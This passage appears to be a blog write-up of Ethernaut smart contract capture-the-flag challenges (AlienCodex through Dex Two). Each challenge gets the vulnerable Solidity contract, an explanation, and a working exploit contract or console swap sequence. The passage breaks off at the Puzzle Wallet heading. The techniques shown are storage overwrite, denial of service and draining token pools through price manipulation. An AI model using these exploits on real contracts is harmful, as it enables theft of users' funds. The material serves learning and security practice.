solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">AlienCodex</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">make_contact</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">bytes32 _content</span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint i, bytes32 _content</span>) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="title class_">AlienCodex</span> ac;</span><br><span class="line"></span><br><span class="line"><span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">    ac = <span class="title class_">AlienCodex</span>(_address);</span><br><span class="line">    ac.<span class="title function_">make_contact</span>();</span><br><span class="line">    ac.<span class="title function_">record</span>(<span class="title function_">bytes32</span>(<span class="title function_">bytes2</span>(<span class="number">0xffff</span>)));</span><br><span class="line">    ac.<span class="title function_">retract</span>();</span><br><span class="line">    ac.<span class="title function_">retract</span>();</span><br><span class="line">    ac.<span class="title function_">revise</span>(<span class="number">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</span>,<span class="title function_">bytes32</span>(<span class="number">2</span>**<span class="number">255</span> ^ <span class="number">2</span>**<span class="number">160</span> ^ <span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>))));</span><br><span class="line">      <span class="comment">// In [93]: hex( 2**256 - int(io.soliditySha3(abi_types=[&#x27;uint256&#x27;],values=[1]).hex(),16))</span></span><br><span class="line">      <span class="comment">// Out[93]: &#x27;0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20 - Denial"></a>20 - Denial</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line">contract <span class="title class_">Denial</span> &#123;</span><br><span class="line"></span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address public constant owner = <span class="title function_">address</span>(<span class="number">0xA9E</span>);</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public &#123;</span><br><span class="line">        uint amountToSend = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> / <span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.<span class="property">call</span>&#123;<span class="attr">value</span>:amountToSend&#125;(<span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="title function_">payable</span>(owner).<span class="title function_">transfer</span>(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = block.<span class="property">timestamp</span>;</span><br><span class="line">        withdrawPartnerBalances[partner] +=  amountToSend;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contractBalance</span>(<span class="params"></span>) public view returns (uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this challenge we <code>partner</code> need to block the <code>owner</code> to withdraw the funds. since we canâ€™t use <code>revert()</code> like last time in <code>King</code> challenge because this contract uses <code>call</code> instead of transfer. <strong>one of the way is to drain out the funds in the form of gas fee</strong> and the other easiest way is to use <code>throw</code> that is depriciated in latest versions of solidity.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>) external &#123;</span><br><span class="line">        <span class="keyword">throw</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="21-Shop"><a href="#21-Shop" class="headerlink" title="21 - Shop"></a>21 - Shop</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Buyer</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) external view returns (uint);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Shop</span> &#123;</span><br><span class="line">  uint public price = <span class="number">100</span>;</span><br><span class="line">  bool public isSold;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) public &#123;</span><br><span class="line">    <span class="title class_">Buyer</span> _buyer = <span class="title class_">Buyer</span>(msg.<span class="property">sender</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_buyer.<span class="title function_">price</span>() &gt;= price &amp;&amp; !isSold) &#123;</span><br><span class="line">      isSold = <span class="literal">true</span>;</span><br><span class="line">      price = _buyer.<span class="title function_">price</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In this challenge we need to overwrite the <code>price</code> variable to be less than <code>100</code> but it is not possible since the contract checks if the <code>_buyer.price() &gt; price</code>. since we are the <code>_buyer</code> and we can make a smart contract that send a high price while check and low price while override, this can be done by tracking the <code>isSold</code> variable.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">Shop</span> &#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">buy</span>(<span class="params"></span>) external;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isSold</span>(<span class="params"></span>) external view <span class="title function_">returns</span>(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Exploit</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Shop</span> s;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address _address</span>)&#123;</span><br><span class="line">    s = <span class="title class_">Shop</span>(_address);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) public&#123;</span><br><span class="line">    s.<span class="title function_">buy</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">price</span>(<span class="params"></span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> s.<span class="title function_">isSold</span>()? <span class="number">0</span> : <span class="number">100</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="22-Dex"><a href="#22-Dex" class="headerlink" title="22 - Dex"></a>22 - Dex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Dex</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">addLiquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>((<span class="keyword">from</span> == token1 &amp;&amp; to == token2) || (<span class="keyword">from</span> == token2 &amp;&amp; to == token1), <span class="string">&quot;Invalid tokens&quot;</span>);</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapPrice</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapPrice</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableToken</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableToken</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint256 initialSupply</span>) <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>To complete this challenge we need to drain out at least one type of the token from the 2 available types of tokens form the contract. since the <strong>swap price is dependent on the balance of 2 tokens</strong> we can <strong>swap a the token which has less balance to get more tokens</strong> for <strong>low price</strong>, doing this repeatedly we can drain out all <code>110 tokens</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-&gt; swap 1 request: tkn2; a:0,b:20</span><br><span class="line">-&gt; swap 1 request: tkn1; a:24,b:0</span><br><span class="line">-&gt; swap 1 request: tkn2; a:0,b:30</span><br><span class="line">-&gt; swap 1 request: tkn1; a:41,b:0</span><br><span class="line">-&gt; swap 1 request: tkn2; a:0,b:65</span><br><span class="line">-&gt; swap 1 request: tkn1; a:110,b:20</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">110</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">10</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">20</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">24</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">30</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">41</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">45</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), player) <span class="comment">// -&gt; 110</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), player) <span class="comment">// -&gt; 20</span></span><br></pre></td></tr></table></figure><hr><h2 id="23-Dex-Two"><a href="#23-Dex-Two" class="headerlink" title="23 - Dex Two"></a>23 - Dex Two</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/IERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&#x27;openzeppelin-contracts-08/access/Ownable.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DexTwo</span> is <span class="title class_">Ownable</span> &#123;</span><br><span class="line">  address public token1;</span><br><span class="line">  address public token2;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setTokens</span>(<span class="params">address _token1, address _token2</span>) public onlyOwner &#123;</span><br><span class="line">    token1 = _token1;</span><br><span class="line">    token2 = _token2;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">add_liquidity</span>(<span class="params">address token_address, uint amount</span>) public onlyOwner &#123;</span><br><span class="line">    <span class="title class_">IERC20</span>(token_address).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(msg.<span class="property">sender</span>) &gt;= amount, <span class="string">&quot;Not enough to swap&quot;</span>);</span><br><span class="line">    uint swapAmount = <span class="title function_">getSwapAmount</span>(<span class="keyword">from</span>, to, amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">transferFrom</span>(msg.<span class="property">sender</span>, <span class="title function_">address</span>(<span class="variable language_">this</span>), amount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">approve</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), swapAmount);</span><br><span class="line">    <span class="title class_">IERC20</span>(to).<span class="title function_">transferFrom</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>), msg.<span class="property">sender</span>, swapAmount);</span><br><span class="line">  &#125; </span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getSwapAmount</span>(<span class="params">address <span class="keyword">from</span>, address to, uint amount</span>) public view <span class="title function_">returns</span>(<span class="params">uint</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span>((amount * <span class="title class_">IERC20</span>(to).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)))/<span class="title class_">IERC20</span>(<span class="keyword">from</span>).<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address spender, uint amount</span>) public &#123;</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token1).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">    <span class="title class_">SwappableTokenTwo</span>(token2).<span class="title function_">approve</span>(msg.<span class="property">sender</span>, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address token, address account</span>) public view returns (uint)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">IERC20</span>(token).<span class="title function_">balanceOf</span>(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">SwappableTokenTwo</span> is <span class="title class_">ERC20</span> &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">address dexInstance, string memory name, string memory symbol, uint initialSupply</span>) <span class="title class_">ERC20</span>(name, symbol) &#123;</span><br><span class="line">        <span class="title function_">_mint</span>(msg.<span class="property">sender</span>, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address owner, address spender, uint256 amount</span>) public &#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != _dex, <span class="string">&quot;InvalidApprover&quot;</span>);</span><br><span class="line">    <span class="variable language_">super</span>.<span class="title function_">_approve</span>(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>This is the same <code>dex</code> challenge without a check inside the <code>swap</code> function that allows to swap any token instead of being limitied to only 2 tokens, <strong>this allows us to contol the swap price to whatever we want</strong>. sending only one token of our own to the challenge contract can give us all the tokens of the contract. so first i have created a token with <strong>4</strong> as <code>totalSupply</code> and approved them for my address and the instance address and sent one token to the contract. now for the swap price for the <strong>swap from my own_token to token1</strong> will be <code>100/1 * 1</code> which is <code>100</code> and <strong>I get 100 of token1 for just one token of my own</strong>, similarly for the second swap the swap price will be <code>100/2 * 2</code> which is also <code>100</code> and I get all the tokens.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> token_own = <span class="string">&quot;0x07e491A192F73AF5e584A89a86A99F97a48bE6c9&quot;</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance,<span class="number">110</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token_own, <span class="keyword">await</span> contract.<span class="title function_">token1</span>(), <span class="number">1</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token_own, <span class="keyword">await</span> contract.<span class="title function_">token2</span>(), <span class="number">2</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token1</span>(), player) <span class="comment">// -&gt; 110</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(<span class="keyword">await</span> contract.<span class="title function_">token2</span>(), player) <span class="comment">// -&gt; 20</span></span><br></pre></td></tr></table></figure><hr><h2 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24 - Puzzle Wallet"></a>24 - Puzzle Wallet</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span 